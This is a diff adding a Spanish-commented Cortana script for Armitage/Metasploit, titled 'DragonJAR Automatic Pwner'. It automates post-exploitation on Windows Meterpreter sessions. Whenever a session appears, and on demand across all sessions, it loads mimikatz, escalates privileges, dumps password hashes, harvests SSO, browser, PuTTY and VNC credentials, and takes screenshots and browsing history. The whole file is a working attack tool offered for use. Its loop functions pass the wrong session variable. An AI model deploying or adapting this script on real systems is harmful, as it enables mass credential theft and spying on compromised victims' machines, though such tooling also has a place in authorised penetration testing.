@@ -1,0 +1,165 @@
+#
+# DragonJAR Automatic Pwner
+# Sencillo Script de Cortana para automatizar procesos en Armitage
+# Author: @DragonJAR 
+# Version: 0.01
+
+println("[+] Iniciando DAPwner");
+
+on session_sync
+{
+
+    local('$hostconsessiones @hostsessions ');
+    println("[*] Nueva sesión detectada ");
+    
+    if (-iswinmeterpreter $1) {
+
+        # Almacenamos la IP de la session
+        $hostconsessiones = session_host($1);
+        
+        # Almacenamos las sessiones del host
+        @hostsessions = host_sessions($hostconsessiones);
+        
+        # correr a todo
+        if ($automatico == 0){
+        
+            if (size(@hostsessions) == 1){
+                # ejecutar la acción
+                comandoAutomatico($1);
+            }
+            
+            else{
+                #println("ya se ejecutó en $hostconsessiones");
+            }
+        }
+        else{
+            println("[*] Se detectó una nueva sesión pero no se corrió nada en ella (configure la automatización) ");    
+        }   
+    }
+}
+
+###################################################
+#
+# COMANDOS A EJECUTAR
+#
+###################################################
+
+sub extraerpass 
+{
+    println("[*] Sacando Contraseñas en ".session_host($1)." en la sesión $1");
+
+    # Cargando mimikatz y dandole tiempo para ejecutarlo
+    m_cmd($1, "load mimikatz");
+        
+    println("    Escalando Privilegios (priv_migrate)");
+    m_cmd($1, "run post/windows/manage/priv_migrate");
+
+    println("    Sacando hash (smart_hashdump)");
+    m_cmd($1, "run post/windows/gather/smart_hashdump");
+
+    println("    Sacando claves de Windows Single Sign On (sso)");
+    m_cmd($1, "run post/windows/gather/credentials/sso");
+    m_cmd($1, "wdigest");
+    
+    println("    Sacando claves de Firefox (firefox_creds)");
+    m_cmd($1, "run post/multi/gather/firefox_creds");
+
+    println("    Sacando claves de Chrome (enum_chrome)");
+    m_cmd($1, "run post/windows/gather/enum_chrome");
+
+    println("    Sacando claves de Internet Explorer (enum_ie)");
+    m_cmd($1, "run post/windows/gather/enum_ie");
+
+    println("    Sacando claves de Putty (enum_putty_saved_sessions)");
+    m_cmd($1, "run post/windows/gather/enum_putty_saved_sessions");
+
+    println("    Sacando claves de VNC");
+    m_cmd($1, "run post/windows/gather/credentials/vnc");
+
+    println("[*] Ya tengo las contraseñas de ".session_host($1)." en la sesión $1");
+}
+
+sub extraerinfo
+{    
+    println("[*] Sacando Información en ".session_host($1)." en la sesión $1");
+
+    println("    Sacando info Basica (sysinfo)");
+    m_cmd($1, "sysinfo");
+
+    println("    Tomando un pantallazo (screenshot)");
+    m_cmd($1, "screenshot");
+
+    println("    Sacando historial de navegación (browser_history)");
+    m_cmd($1, "run post/windows/gather/forensics/browser_history");
+
+    println("[*] Ya tengo la información de ".session_host($1)." en la sesión $1");
+}
+
+sub comandoAutomatico
+{
+    extraerpass($1);
+    extraerinfo($1);
+}
+
+sub entodospass {
+    println("entro auto pass");
+    foreach $sid (session_ids())
+    {
+        println("Automatizando en sesión ". $sid);
+        extraerpass($1);
+    }
+}
+
+sub entodosinfo {
+println("entro auto info");
+    foreach $sid (session_ids())
+    {
+        println("Automatizando en sesión ". $sid);
+        extraerinfo($1);
+    }
+}
+
+###################################################
+#
+#  MENU EN LA INTERFACE DE ARMITAGE
+#
+###################################################
+
+
+popup main_middle {
+
+    menu "DAPwner" {
+
+        menu "Ejecución masiva de"{
+            item "Extracción de Contraseñas"{
+                entodospass($1);
+            }
+            item "Extracción de Información"{
+                entodosinfo($1);
+            }
+        }
+
+        item "¿Correr automaticamente?" {
+            local('$argumentos');
+            $argumentos = prompt_confirm("Desea correr los comandos automaticamente", "Habilitar Automatización");
+            $automatico = $argumentos;
+            println("Configuración automatica:       " . $automatico);
+        }
+    }
+}
+
+# Añadiendo dentro del menú de meterpreter
+popup meterpreter_top {
+    
+    menu "DAPwner" {
+                
+        item "Extraer Contraseñas" {
+            extraerpass($1);
+        }
+
+        item "Extraer Información" {
+            extraerinfo($1);
+        }
+        
+    }
+}
